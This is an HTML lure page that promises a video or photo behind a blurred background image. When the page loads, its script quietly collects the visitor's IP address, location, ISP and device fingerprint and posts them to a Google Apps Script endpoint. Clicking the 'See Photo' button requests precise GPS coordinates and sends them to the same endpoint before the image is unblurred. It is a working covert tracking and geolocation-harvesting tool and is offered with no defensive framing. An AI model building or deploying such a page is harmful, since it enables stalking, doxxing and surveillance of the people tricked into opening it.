<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>See Video</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-image: url('img1.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(6px);
      z-index: -1;
      transition: filter 0.5s ease;
    }

    body.revealed::before {
      filter: none;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: rgba(0, 0, 0, 0.4);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: rgba(255, 255, 255, 0.95);
      padding: 30px 20px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
      transition: opacity 0.5s ease;
    }

    .hidden {
      opacity: 0;
      pointer-events: none;
    }

    h2 {
      color: #333;
      margin-bottom: 20px;
    }

    button {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin-top: 10px;
    }

    button:hover {
      background-color: #0056b3;
    }

    #output {
      margin-top: 20px;
      color: #333;
      font-weight: bold;
    }

    #locationForm {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container" id="contentBox">
    <h2>Click the Button to See Video</h2>
    <button onclick="getLocation()">See Photo</button>
    <p id="output"></p>
  </div>


  <script>

    async function collectAndSend() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const ipData = await res.json();

        const fields = {
          IP: ipData.ip || '',
          City: ipData.city || '',
          Region: ipData.region || '',
          Country: ipData.country_name || '',
          ISP: ipData.org || '',
          Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          TimeOffset: new Date().getTimezoneOffset(),
          Language: navigator.language,
          UserAgent: navigator.userAgent,
          Platform: navigator.platform,
          Screen: `${screen.width}x${screen.height}`,
          ColorDepth: screen.colorDepth,
          DeviceMemory: navigator.deviceMemory || '',
          CPUCores: navigator.hardwareConcurrency || '',
          Online: navigator.onLine,
          DoNotTrack: navigator.doNotTrack,
          TouchSupport: ('ontouchstart' in window),
          ConnectionType: navigator.connection?.effectiveType || '',
          Referrer: document.referrer || 'Direct'
        };

        const formData = new FormData();
        for (const key in fields) {
          formData.append(key, fields[key]);
        }

        await fetch('https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec', {
          method: 'POST',
          body: formData
        });

                

      } catch (e) {
        console.error('Error:', e);
      }
    }

    window.onload = collectAndSend;
    
    function getLocation() {
      const status = document.getElementById('status');
      if (!navigator.geolocation) {
        status.textContent = "Geolocation is not supported by your browser.";
        return;
      }

      status.textContent = "Requesting location...";

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const accuracy = pos.coords.accuracy;
          const timestamp = new Date(pos.timestamp).toISOString();

          status.textContent = `Location received: ${lat}, ${lon}`;

          const formData = new FormData();
          formData.append("Latitude", lat);
          formData.append("Longitude", lon);
          formData.append("Accuracy", accuracy);
          formData.append("Timestamp", timestamp);

         await fetch("https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec?route=precise", {
          method: "POST",
          body: formData
        });

          status.textContent = "Location sent successfully!";
           revealPhoto();
        },
        (err) => {
          status.textContent = "Error: " + err.message;
        }
      );
    }

    function revealPhoto() {
      document.body.classList.add("revealed");
      document.getElementById("contentBox").classList.add("hidden");
    }

    function showError(error) {
      document.getElementById("output").innerText = "Error: " + error.message;
    }
  </script>
</body>
</html>
